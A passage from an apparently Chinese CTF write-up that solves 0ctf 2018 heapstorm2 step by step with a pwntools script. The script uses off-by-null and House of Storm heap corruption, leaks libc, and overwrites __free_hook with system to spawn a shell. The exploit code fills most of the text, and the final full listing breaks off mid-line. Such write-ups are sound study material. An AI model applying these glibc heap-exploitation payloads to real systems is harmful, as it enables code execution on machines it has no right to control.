class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-id">#coding</span>:utf-<span class="hljs-number">8</span><br>from pwn import *<br><span class="hljs-built_in">context</span>(endian=<span class="hljs-string">'little'</span>,os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>)<br>sh = <span class="hljs-built_in">process</span>(<span class="hljs-string">'./0ctf_2018_heapstorm2'</span>)<br>libc = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">'./libc-2.23.so'</span>)<br>#命令简写化<br>s       = lambda data               :sh.<span class="hljs-built_in">send</span>(data)<br>sa      = lambda delim,data         :sh.<span class="hljs-built_in">sendafter</span>(delim,data)<br>sl      = lambda data               :sh.<span class="hljs-built_in">sendline</span>(data)<br>sla     = lambda delim,data         :sh.<span class="hljs-built_in">sendlineafter</span>(delim,data)<br>r       = lambda num=<span class="hljs-number">4096</span>           :sh.<span class="hljs-built_in">recv</span>(num)<br>rl      = lambda num=<span class="hljs-number">4096</span>           :sh.<span class="hljs-built_in">recvline</span>(num)<br>ru      = lambda delims   :sh.<span class="hljs-built_in">recvuntil</span>(delims )<br>itr     = lambda                    :sh.<span class="hljs-built_in">interactive</span>()<br>uu32    = lambda data               :<span class="hljs-built_in">u32</span>(data.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :<span class="hljs-built_in">u64</span>(data.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          :log.<span class="hljs-built_in">success</span>(<span class="hljs-string">'{} = {:#x}'</span>.<span class="hljs-built_in">format</span>(name, addr))<br>def <span class="hljs-built_in">dbg</span>():<br>    gdb.<span class="hljs-built_in">attach</span>(sh)<br>    <span class="hljs-built_in">pause</span>()<br>def <span class="hljs-built_in">add</span>(size):<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Command: '</span>,<span class="hljs-string">'1'</span>)<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Size: '</span>,<span class="hljs-built_in">str</span>(size))  # <span class="hljs-number">12</span>&lt;size&lt;<span class="hljs-number">0</span>x1000<br><br><br>def <span class="hljs-built_in">edit</span>(idx,content):<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Command: '</span>,<span class="hljs-string">'2'</span>)<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Index: '</span>,<span class="hljs-built_in">str</span>(idx))<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Size: '</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    <span class="hljs-built_in">sa</span>(<span class="hljs-string">'Content: '</span>,content)<br><br><br><br>def <span class="hljs-built_in">free</span>(idx):<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Command: '</span>,<span class="hljs-string">'3'</span>)<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Index: '</span>,<span class="hljs-built_in">str</span>(idx))<br><br><br>def <span class="hljs-built_in">show</span>(idx):<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Command: '</span>,<span class="hljs-string">'4'</span>)<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Index: '</span>,<span class="hljs-built_in">str</span>(idx))<br></code></pre></td></tr></tbody></table></figure><p>和上一题一样，先构造一个unsortedbin和largebin，并且利用off-by-null来实现控制unsortedbin chunk的bk指针和largebin chunk的bk和bk_size指针，然后再malloc chunk，将chunk分配到0x13370800处，这里要注意的是这道题的edit函数有点不同，会把我们输入的字节后面加上12字节再加一个’\x00’，所以我们每次edit都要少输入12字节即可实现0ff-by-null。</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#---------------布置chunk-------------------------#</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">0</span>   <br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x508)#<span class="hljs-number">1</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">2</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">3</span>   <br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x508)#<span class="hljs-number">4</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">5</span>   <br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">6</span>   <br><br><span class="hljs-comment">#----------------准备 unsorted chunk-----------------------#</span><br><span class="hljs-attribute">edit</span>(<span class="hljs-number">1</span>,'\x00'*<span class="hljs-number">0</span>x4F0+p64(<span class="hljs-number">0</span>x500)) <br><span class="hljs-attribute">free</span>(<span class="hljs-number">1</span>)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">0</span>,'\x00'*(<span class="hljs-number">0</span>x18-<span class="hljs-number">12</span>))<br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18) #<span class="hljs-number">1</span> <br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4d8) #<span class="hljs-number">7</span>   <br><br><span class="hljs-attribute">free</span>(<span class="hljs-number">1</span>)   <br><span class="hljs-attribute">free</span>(<span class="hljs-number">2</span>) #<span class="hljs-number">1</span>-<span class="hljs-number">2</span><br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x38)#<span class="hljs-number">1</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4e8)#<span class="hljs-number">2</span>  <br><br><span class="hljs-comment">#-------------------准备 large chunk-----------------------------------#</span><br><span class="hljs-attribute">edit</span>(<span class="hljs-number">4</span>,'\x00'*<span class="hljs-number">0</span>x4F0+p64(<span class="hljs-number">0</span>x500))<br><span class="hljs-attribute">free</span>(<span class="hljs-number">4</span>)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">3</span>,'\x00'*(<span class="hljs-number">0</span>x18-<span class="hljs-number">12</span>)) <br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x18) #<span class="hljs-number">4</span><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4d8) #<span class="hljs-number">8</span><br><br><span class="hljs-attribute">free</span>(<span class="hljs-number">4</span>)<br><span class="hljs-attribute">free</span>(<span class="hljs-number">5</span>) #<span class="hljs-number">4</span>-<span class="hljs-number">5</span> <br><br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x48)#<span class="hljs-number">4</span>  <br><span class="hljs-comment">#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#</span><br><span class="hljs-attribute">free</span>(<span class="hljs-number">2</span>)<br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x4e8) <br><span class="hljs-attribute">free</span>(<span class="hljs-number">2</span>) <br><span class="hljs-comment">#--------------修改他们是的满足条件进行 house of strom------------------------------#</span><br><span class="hljs-attribute">fake_chunk</span> = <span class="hljs-number">0</span>x13370800 - <span class="hljs-number">0</span>x20<br><span class="hljs-attribute">payload</span> = '\x00' * <span class="hljs-number">0</span>x10 + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>x4f1) + p64(<span class="hljs-number">0</span>) + p64(fake_chunk)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">7</span>, payload) #修改unsorted chunk的bk<br><br><span class="hljs-attribute">payload</span> = '\x00' * <span class="hljs-number">0</span>x20 + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>x4e1) + p64(<span class="hljs-number">0</span>) + p64(fake_chunk+<span class="hljs-number">8</span>) + p64(<span class="hljs-number">0</span>) + p64(fake_chunk-<span class="hljs-number">0</span>x18-<span class="hljs-number">5</span>)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">8</span>, payload)  <br><span class="hljs-attribute">add</span>(<span class="hljs-number">0</span>x48) <br></code></pre></td></tr></tbody></table></figure><p>现在我们已经可以控制0x13370800处的值了，我们把这些随机数都改为0，然后把chunk_0改为0x13370800，以此来实现控制</p><figure class="highlight apache"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#-----------------------泄漏 libc----------------------------------#</span><br><span class="hljs-comment">#由于bins中的chunk的fd,bk指向libc的地址，我们先要泄漏heap的地址</span><br><br><span class="hljs-attribute">payload</span> = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span> + p64(<span class="hljs-number">0</span>x13370800)<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">2</span>, payload) #修改了r0~r4为<span class="hljs-number">0</span>，并且修改了chunk0的地址，此时的chunk0的size非常大，因为异或的是<span class="hljs-number">0</span><br><br><span class="hljs-attribute">dbg</span>()<br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/5f044d56d0c44edb8e660e12e3bcaed3.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/5f044d56d0c44edb8e660e12e3bcaed3.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br class='item-img' data-src='https://img-blog.csdnimg.cn/e14aefc2bf3441d7a953157a9dfcd27a.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/e14aefc2bf3441d7a953157a9dfcd27a.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p><p class='item-img' data-src='https://img-blog.csdnimg.cn/f0caae54a60245fc93f7b19db749773b.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/f0caae54a60245fc93f7b19db749773b.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p><p>之后修改0x13370800处的第三个和第四个数分别为0和0x13377331，两者异或得到0x13377331，越过show函数的检查，此时已经可以使用show函数，因为我们要泄露的unsortedbin chunk的fd指针（指向main_arena+88），我们必须在chunk的全局数组中写入0x56104462a060来show，但是程序每次运行地址不同，由上图可知fake_chunk+3处存放的就是0x56104462a060，<br>所以我们需要利用fake_chunk+3（unsortedbin chunk的地址）来泄露libc，我们每次把chunk0的位置写为0x13370800，就可以实现每次通过chunk0来控制0x13370800</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload = <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> +<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13377331)  #满足show的条件<br>payload += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13370800) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x1000) <span class="hljs-selector-id">#chunk0</span><br>payload += <span class="hljs-built_in">p64</span>(fake_chunk+<span class="hljs-number">3</span>) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">8</span>)   <span class="hljs-selector-id">#chunk1</span><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">0</span>, payload)</span></span> #满足show的条件<br><br><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span>  #我们刚刚house of storm 写的地址泄漏出来<br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">"]: "</span>)</span></span><br>heap = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">r</span>(<span class="hljs-number">6</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>))<br><span class="hljs-function"><span class="hljs-title">success</span><span class="hljs-params">(<span class="hljs-string">"heap:"</span>+hex(heap)</span></span>)<br><br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/cf60539043db433c95bc3f6a7ac6caff.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/cf60539043db433c95bc3f6a7ac6caff.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p><p class='item-img' data-src='https://img-blog.csdnimg.cn/29c15a75b6b34ba1988f64a95bdcf946.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/29c15a75b6b34ba1988f64a95bdcf946.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>此时我们成功泄露出unsortedbin chunk的地址，我们再修改全局数组为unsortedbin chunk的地址+0x10（main_arena+88），然后即可泄露处libc基地址</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus">payload  = <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13377331)#满足show的条件<br>payload += <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x13370800) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x1000) <span class="hljs-selector-id">#chunk0</span><br>payload += <span class="hljs-built_in">p64</span>(heap+<span class="hljs-number">0</span>x10) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">8</span>) <span class="hljs-selector-id">#chunk1</span><br><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">0</span>, payload)</span></span><br><span class="hljs-function"><span class="hljs-title">show</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span> #泄漏libc地址<br><span class="hljs-function"><span class="hljs-title">ru</span><span class="hljs-params">(<span class="hljs-string">"]: "</span>)</span></span><br>malloc_hook = <span class="hljs-built_in">u64</span>(<span class="hljs-built_in">r</span>(<span class="hljs-number">6</span>)<span class="hljs-selector-class">.ljust</span>(<span class="hljs-number">8</span>, <span class="hljs-string">'\x00'</span>)) -<span class="hljs-number">0</span>x58 - <span class="hljs-number">0</span>x10<br>libc_base = malloc_hook - libc<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">'__malloc_hook'</span>]</span><br>free_hook = libc_base+libc<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">'__free_hook'</span>]</span><br>system = libc_base+ libc<span class="hljs-selector-class">.sym</span><span class="hljs-selector-attr">[<span class="hljs-string">'system'</span>]</span><br><span class="hljs-function"><span class="hljs-title">success</span><span class="hljs-params">(<span class="hljs-string">"free_hook:"</span>+hex(free_hook)</span></span>)<br><span class="hljs-function"><span class="hljs-title">dbg</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/aed1148758fa403a88ce058db848df8b.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/aed1148758fa403a88ce058db848df8b.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p><p>之后我们要做到就是在全局数组里写入free hook地址和/bin/sh，将其改为system，获得shell，free_hook在chunk0处，/bin/sh\x00在chunk1处</p><figure class="highlight gcode"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-attr">#--------------修改 free_hook -----------------------------------#</span><br><span class="hljs-attr">payload  = p64</span><span class="hljs-comment">(0)</span>*<span class="hljs-number">4</span><br>payload += p<span class="hljs-number">64</span><span class="hljs-comment">(free_hook)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(0x100)</span><span class="hljs-attr">#chunk0</span><br>payload += p<span class="hljs-number">64</span><span class="hljs-comment">(0x13370800+0x40)</span> + p<span class="hljs-number">64</span><span class="hljs-comment">(8)</span><span class="hljs-attr">#chunk1</span><br>payload += <span class="hljs-string">'/bin/sh\x00'</span><br>edit<span class="hljs-comment">(0, payload)</span><br><br>dbg<span class="hljs-comment">()</span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/bb966a3843c24bdcac635f1a1d52c453.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/bb966a3843c24bdcac635f1a1d52c453.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"><br>之后改free_hook为system，free(1)，获得shell</p><figure class="highlight stylus"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">edit</span><span class="hljs-params">(<span class="hljs-number">0</span>, p64(system)</span></span>)<br><span class="hljs-function"><span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-number">1</span>)</span></span><br><br><span class="hljs-function"><span class="hljs-title">itr</span><span class="hljs-params">()</span></span><br></code></pre></td></tr></tbody></table></figure><p class='item-img' data-src='https://img-blog.csdnimg.cn/96b6b52cd2734f3b8c13806244a0c5fe.png?ynotemdtimestamp=1663776442613'><img src="https://img-blog.csdnimg.cn/96b6b52cd2734f3b8c13806244a0c5fe.png?ynotemdtimestamp=1663776442613" alt="在这里插入图片描述"></p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight css"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-id">#coding</span>:utf-<span class="hljs-number">8</span><br>from pwn import *<br><span class="hljs-built_in">context</span>(endian=<span class="hljs-string">'little'</span>,os=<span class="hljs-string">'linux'</span>,arch=<span class="hljs-string">'amd64'</span>,log_level=<span class="hljs-string">'debug'</span>)<br>sh = <span class="hljs-built_in">process</span>(<span class="hljs-string">'./0ctf_2018_heapstorm2'</span>)<br>libc = <span class="hljs-built_in">ELF</span>(<span class="hljs-string">'./libc-2.23.so'</span>)<br>#命令简写化<br>s       = lambda data               :sh.<span class="hljs-built_in">send</span>(data)<br>sa      = lambda delim,data         :sh.<span class="hljs-built_in">sendafter</span>(delim,data)<br>sl      = lambda data               :sh.<span class="hljs-built_in">sendline</span>(data)<br>sla     = lambda delim,data         :sh.<span class="hljs-built_in">sendlineafter</span>(delim,data)<br>r       = lambda num=<span class="hljs-number">4096</span>           :sh.<span class="hljs-built_in">recv</span>(num)<br>rl      = lambda num=<span class="hljs-number">4096</span>           :sh.<span class="hljs-built_in">recvline</span>(num)<br>ru      = lambda delims   :sh.<span class="hljs-built_in">recvuntil</span>(delims )<br>itr     = lambda                    :sh.<span class="hljs-built_in">interactive</span>()<br>uu32    = lambda data               :<span class="hljs-built_in">u32</span>(data.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">4</span>,<span class="hljs-string">'\0'</span>))<br>uu64    = lambda data               :<span class="hljs-built_in">u64</span>(data.<span class="hljs-built_in">ljust</span>(<span class="hljs-number">8</span>,<span class="hljs-string">'\0'</span>))<br>leak    = lambda name,addr          :log.<span class="hljs-built_in">success</span>(<span class="hljs-string">'{} = {:#x}'</span>.<span class="hljs-built_in">format</span>(name, addr))<br><br>def <span class="hljs-built_in">dbg</span>():<br>        gdb.<span class="hljs-built_in">attach</span>(sh)<br>        <span class="hljs-built_in">pause</span>()<br>def <span class="hljs-built_in">add</span>(size):<br><br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Command: '</span>,<span class="hljs-string">'1'</span>)<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Size: '</span>,<span class="hljs-built_in">str</span>(size))  # <span class="hljs-number">12</span>&lt;size&lt;<span class="hljs-number">0</span>x1000<br><br><br>def <span class="hljs-built_in">edit</span>(idx,content):<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Command: '</span>,<span class="hljs-string">'2'</span>)<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Index: '</span>,<span class="hljs-built_in">str</span>(idx))<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Size: '</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(content)))<br>    <span class="hljs-built_in">sa</span>(<span class="hljs-string">'Content: '</span>,content)<br><br><br><br>def <span class="hljs-built_in">free</span>(idx):<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Command: '</span>,<span class="hljs-string">'3'</span>)<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Index: '</span>,<span class="hljs-built_in">str</span>(idx))<br><br><br>def <span class="hljs-built_in">show</span>(idx):<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Command: '</span>,<span class="hljs-string">'4'</span>)<br>    <span class="hljs-built_in">sla</span>(<span class="hljs-string">'Index: '</span>,<span class="hljs-built_in">str</span>(idx))<br><br>#---------------布置chunk-------------------------#<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">0</span> <br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x508)#<span class="hljs-number">1</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">2</span><br><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">3</span>   <br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x508)#<span class="hljs-number">4</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">5</span>   <br><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x18)#<span class="hljs-number">6</span>  <br><br>#----------------准备 unsorted chunk-----------------------#<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">1</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0</span>x4F0+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x500)) <br><span class="hljs-built_in">free</span>(<span class="hljs-number">1</span>)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">0</span>,<span class="hljs-string">'\x00'</span>*(<span class="hljs-number">0</span>x18-<span class="hljs-number">12</span>))  <br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x18) #<span class="hljs-number">1</span> <br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x4d8) #<span class="hljs-number">7</span>  <br><br><span class="hljs-built_in">free</span>(<span class="hljs-number">1</span>)   <br><span class="hljs-built_in">free</span>(<span class="hljs-number">2</span>) #<span class="hljs-number">1</span>-<span class="hljs-number">2</span> 合并  <br><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x38)#<span class="hljs-number">1</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x4e8)#<span class="hljs-number">2</span>   <br><br>#-------------------准备 large chunk-----------------------------------#<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">4</span>,<span class="hljs-string">'\x00'</span>*<span class="hljs-number">0</span>x4F0+<span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x500))#伪造chunk<br><span class="hljs-built_in">free</span>(<span class="hljs-number">4</span>)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">3</span>,<span class="hljs-string">'\x00'</span>*(<span class="hljs-number">0</span>x18-<span class="hljs-number">12</span>)) <br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x18) #<span class="hljs-number">4</span><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x4d8) #<span class="hljs-number">8</span>  <br><br><span class="hljs-built_in">free</span>(<span class="hljs-number">4</span>)<br><span class="hljs-built_in">free</span>(<span class="hljs-number">5</span>) #<span class="hljs-number">4</span>-<span class="hljs-number">5</span> <br><br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x48)#<span class="hljs-number">4</span>  <br>#---------------unsorted chunk 和 large chunk 放到对应位置----------------------#<br><span class="hljs-built_in">free</span>(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">add</span>(<span class="hljs-number">0</span>x4e8) <br><span class="hljs-built_in">free</span>(<span class="hljs-number">2</span>)   <br>#--------------修改他们是的满足条件进行 house of strom------------------------------#<br>fake_chunk = <span class="hljs-number">0</span>x13370800 - <span class="hljs-number">0</span>x20<br>payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0</span>x10 + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>x4f1) + <span class="hljs-built_in">p64</span>(<span class="hljs-number">0</span>) + <span class="hljs-built_in">p64</span>(fake_chunk)<br><span class="hljs-built_in">edit</span>(<span class="hljs-number">7</span>, payload) #修改unsorted chunk的bk<br><br>payload = <span 